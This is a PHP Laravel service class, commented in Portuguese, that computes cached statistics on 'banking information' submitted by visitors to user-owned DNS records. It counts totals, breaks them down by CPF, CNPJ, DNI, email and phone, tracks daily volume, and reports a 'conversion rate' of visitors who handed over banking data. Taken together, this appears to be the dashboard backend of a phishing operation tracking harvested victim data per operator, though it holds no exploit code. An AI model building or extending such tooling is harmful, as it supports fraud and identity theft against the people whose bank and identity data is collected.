<?php

namespace App\Services;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Cache;

/**
 * Serviço para estatísticas relacionadas a informações bancárias
 * 
 * Centraliza todas as consultas e estatísticas relacionadas às 
 * informações bancárias associadas aos visitantes DNS.
 */
class BankingStatisticsService extends StatisticsService
{
    /**
     * Obtém estatísticas gerais de informações bancárias
     *
     * @param int|null $userId ID do usuário (opcional)
     * @return array
     */
    public function getGlobalStats(?int $userId = null): array
    {
        $cacheKey = $userId ? "global:user:{$userId}" : "global";
        
        return $this->getCachedStat($cacheKey, function() use ($userId) {
            return [
                'totalInfoBancarias' => $this->getTotalInformacoesBancarias($userId),
                'totalPorIdentificador' => $this->getTotalPorIdentificador($userId),
                'registrosPorDia' => $this->getRegistrosPorDia($userId),
                'taxaDeConversao' => $this->getTaxaDeConversao($userId),
            ];
        });
    }
    
    /**
     * Obtém o total de informações bancárias registradas
     *
     * @param int|null $userId ID do usuário (opcional)
     * @return int
     */
    public function getTotalInformacoesBancarias(?int $userId = null): int
    {
        $cacheKey = $userId ? "total:user:{$userId}" : "total";
        
        return $this->getCachedStat($cacheKey, function() use ($userId) {
            $query = DB::table('informacoes_bancarias')
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid');
                
            if ($userId) {
                $query->join('dns_records', 'visitantes.dns_record_id', '=', 'dns_records.id')
                    ->where('dns_records.user_id', $userId);
            }
            
            return $query->count();
        });
    }
    
    /**
     * Obtém o total de informações bancárias por tipo de identificador
     *
     * @param int|null $userId ID do usuário (opcional)
     * @return array
     */
    public function getTotalPorIdentificador(?int $userId = null): array
    {
        $cacheKey = $userId ? "identificadores:user:{$userId}" : "identificadores";
        
        return $this->getCachedStat($cacheKey, function() use ($userId) {
            $query = DB::table('informacoes_bancarias')
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid');
                
            if ($userId) {
                $query->join('dns_records', 'visitantes.dns_record_id', '=', 'dns_records.id')
                    ->where('dns_records.user_id', $userId);
            }
            
            $result = $query->selectRaw('
                    SUM(CASE WHEN cpf IS NOT NULL THEN 1 ELSE 0 END) as cpf,
                    SUM(CASE WHEN cnpj IS NOT NULL THEN 1 ELSE 0 END) as cnpj,
                    SUM(CASE WHEN email IS NOT NULL THEN 1 ELSE 0 END) as email,
                    SUM(CASE WHEN dni IS NOT NULL THEN 1 ELSE 0 END) as dni,
                    SUM(CASE WHEN telefone IS NOT NULL THEN 1 ELSE 0 END) as telefone
                ')
                ->first();
                
            return (array) $result;
        });
    }
    
    /**
     * Obtém o número de registros de informações bancárias por dia
     *
     * @param int|null $userId ID do usuário (opcional)
     * @param int $dias Número de dias a incluir
     * @return array
     */
    public function getRegistrosPorDia(?int $userId = null, int $dias = 30): array
    {
        $cacheKey = $userId ? "diario:user:{$userId}:dias:{$dias}" : "diario:dias:{$dias}";
        
        return $this->getCachedStat($cacheKey, function() use ($userId, $dias) {
            $query = DB::table('informacoes_bancarias')
                ->select(DB::raw('strftime("%Y-%m-%d", informacoes_bancarias.created_at) as data'), DB::raw('COUNT(*) as total'))
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
                ->where('informacoes_bancarias.created_at', '>=', now()->subDays($dias));
                
            if ($userId) {
                $query->join('dns_records', 'visitantes.dns_record_id', '=', 'dns_records.id')
                    ->where('dns_records.user_id', $userId);
            }
            
            return $query->groupBy('data')
                ->orderBy('data')
                ->get()
                ->mapWithKeys(function($item) {
                    return [$item->data => $item->total];
                })
                ->toArray();
        });
    }
    
    /**
     * Calcula a taxa de conversão (visitantes que forneceram informações bancárias)
     *
     * @param int|null $userId ID do usuário (opcional)
     * @param int $dias Período de dias para análise
     * @return array
     */
    public function getTaxaDeConversao(?int $userId = null, int $dias = 30): array
    {
        $cacheKey = $userId 
            ? "conversao:user:{$userId}:dias:{$dias}" 
            : "conversao:dias:{$dias}";
        
        return $this->getCachedStat($cacheKey, function() use ($userId, $dias) {
            // Query base para visitantes
            $visitantesQuery = DB::table('visitantes')
                ->where('visitantes.created_at', '>=', now()->subDays($dias));
                
            // Query base para informações bancárias
            $infoBancariasQuery = DB::table('informacoes_bancarias')
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
                ->where('informacoes_bancarias.created_at', '>=', now()->subDays($dias));
            
            // Filtra por usuário se especificado
            if ($userId) {
                $visitantesQuery->join('dns_records', 'visitantes.dns_record_id', '=', 'dns_records.id')
                    ->where('dns_records.user_id', $userId);
                    
                $infoBancariasQuery->join('dns_records', 'visitantes.dns_record_id', '=', 'dns_records.id')
                    ->where('dns_records.user_id', $userId);
            }
            
            $totalVisitantes = $visitantesQuery->count();
            $totalInfoBancarias = $infoBancariasQuery->count();
            
            $taxaConversao = $totalVisitantes > 0 
                ? round(($totalInfoBancarias / $totalVisitantes) * 100, 2)
                : 0;
                
            return [
                'visitantes' => $totalVisitantes,
                'conversoes' => $totalInfoBancarias,
                'taxa' => $taxaConversao
            ];
        });
    }
    
    /**
     * Obtém informações bancárias para um registro DNS específico
     *
     * @param int|string $dnsId ID do registro DNS
     * @return array Array com as estatísticas bancárias para o registro DNS
     */
    public function getInformacoesBancarias($dnsId): array
    {
        $cacheKey = "dns:{$dnsId}:info_bancarias";
        
        return $this->getCachedStat($cacheKey, function() use ($dnsId) {
            $totalInfoBancarias = DB::table('informacoes_bancarias')
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
                ->where('visitantes.dns_record_id', $dnsId)
                ->count();
                
            $infosPorIdentificador = DB::table('informacoes_bancarias')
                ->join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
                ->where('visitantes.dns_record_id', $dnsId)
                ->selectRaw('
                    SUM(CASE WHEN cpf IS NOT NULL THEN 1 ELSE 0 END) as cpf,
                    SUM(CASE WHEN cnpj IS NOT NULL THEN 1 ELSE 0 END) as cnpj,
                    SUM(CASE WHEN email IS NOT NULL THEN 1 ELSE 0 END) as email,
                    SUM(CASE WHEN dni IS NOT NULL THEN 1 ELSE 0 END) as dni,
                    SUM(CASE WHEN telefone IS NOT NULL THEN 1 ELSE 0 END) as telefone
                ')
                ->first();
                
            return [
                'total' => $totalInfoBancarias,
                'por_identificador' => (array) $infosPorIdentificador
            ];
        });
    }
    
    /**
     * Invalida caches relacionados a um usuário específico
     *
     * @param int $userId ID do usuário
     * @return void
     */
    public function invalidateUserCache(int $userId): void
    {
        // Limpa os caches relacionados ao usuário específico
        $patterns = [
            "*:user:{$userId}",
            "*:user:{$userId}:*",
        ];
        
        foreach ($patterns as $pattern) {
            Cache::deletePattern($pattern);
        }
        
        // Invalida estatísticas globais que podem ter sido afetadas
        $this->invalidateCache('global');
    }
}
